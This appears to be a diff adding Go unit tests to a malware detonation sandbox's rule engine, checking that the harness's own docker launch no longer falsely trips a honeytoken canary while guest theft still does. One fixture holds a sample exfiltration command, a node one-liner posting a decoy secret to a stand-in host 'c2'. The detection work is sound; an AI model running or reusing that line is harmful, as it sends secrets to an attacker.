@@ -4,6 +4,7 @@ package rules
 import (
 	"testing"
 
+	"detonation/internal/honeytokens"
 	"detonation/internal/trace"
 )
 
@@ -94,6 +95,76 @@ func TestEngineSandboxDNSForwarderIgnored(t *testing.T) {
 	for _, f := range eng.Evaluate(events) {
 		if f.RuleID == "dyn_install_exfil" || f.RuleID == "dyn_install_egress" {
 			t.Errorf("DNS forwarder connect must not produce %s", f.RuleID)
+		}
+	}
+}
+
+// The harness launches the sandbox with `docker run -e DECOY=… -v …/.env:/root/.env`,
+// so that host-side exec's argv carries every planted env decoy by construction. It is
+// traced + attributed to the detonation but is NOT guest behavior — evaluating it
+// self-matched the honeytoken canary (the long discord_webhook env value) on EVERY
+// detonation, flipping legit packages (microsoft-kiota, golang/dep, gopherjs…) to
+// malicious. 2026-06-08 FP cascade.
+func harnessLaunchExec(extraArgs string) trace.TraceEvent {
+	return trace.TraceEvent{
+		Phase: "install", Category: "process", Operation: "exec",
+		Detail: map[string]interface{}{
+			"binary":    "/usr/bin/docker",
+			"arguments": "run --rm --network=bridge --name=det-abc123 --memory=512m " + extraArgs,
+		},
+	}
+}
+
+func TestHoneytokenIgnoresHarnessLaunchCommand(t *testing.T) {
+	cans := honeytokens.Canaries()
+	if len(cans) == 0 {
+		t.Skip("no canaries generated")
+	}
+	decoy := cans[0].Value // longest decoy (discord_webhook) — the one that self-matched
+	evt := harnessLaunchExec("-e DISCORD_WEBHOOK_URL=" + decoy + " -v /tmp/x/.env:/root/.env:ro")
+	eng := NewEngine([]Rule{honeytokenExfil()})
+	if f := eng.Evaluate([]trace.TraceEvent{evt}); len(f) != 0 {
+		t.Fatalf("the harness's own docker-run launch must NOT trip the honeytoken canary, got %+v", f)
+	}
+}
+
+func TestHoneytokenStillCatchesGuestExfil(t *testing.T) {
+	cans := honeytokens.Canaries()
+	if len(cans) == 0 {
+		t.Skip("no canaries generated")
+	}
+	decoy := cans[0].Value
+	// A GUEST process (node, inside the sandbox) that stages a decoy into an exec arg
+	// is real theft and must still convict — the fix only excludes the container runtime.
+	evt := trace.TraceEvent{
+		Phase: "install", Category: "process", Operation: "exec",
+		Detail: map[string]interface{}{
+			"binary":    "/usr/local/bin/node",
+			"arguments": "-e require('https').request('http://c2/x').end('" + decoy + "')",
+		},
+	}
+	eng := NewEngine([]Rule{honeytokenExfil()})
+	f := eng.Evaluate([]trace.TraceEvent{evt})
+	if len(f) != 1 || f[0].RuleID != "dyn_honeytoken_exfil" {
+		t.Fatalf("a guest process staging a decoy for exfil must still convict, got %+v", f)
+	}
+}
+
+func TestIsHarnessLaunch(t *testing.T) {
+	cases := []struct {
+		name   string
+		evt    trace.TraceEvent
+		expect bool
+	}{
+		{"docker run", harnessLaunchExec(""), true},
+		{"guest node", trace.TraceEvent{Category: "process", Operation: "exec",
+			Detail: map[string]interface{}{"binary": "/usr/local/bin/node"}}, false},
+		{"network connect", trace.TraceEvent{Category: "network", Operation: "connect",
+			Detail: map[string]interface{}{"addr": "1.2.3.4"}}, false},
+	}
+	for _, c := range cases {
+		if got := isHarnessLaunch(c.evt); got != c.expect {
+			t.Errorf("%s: isHarnessLaunch = %v, want %v", c.name, got, c.expect)
 		}
 	}
 }
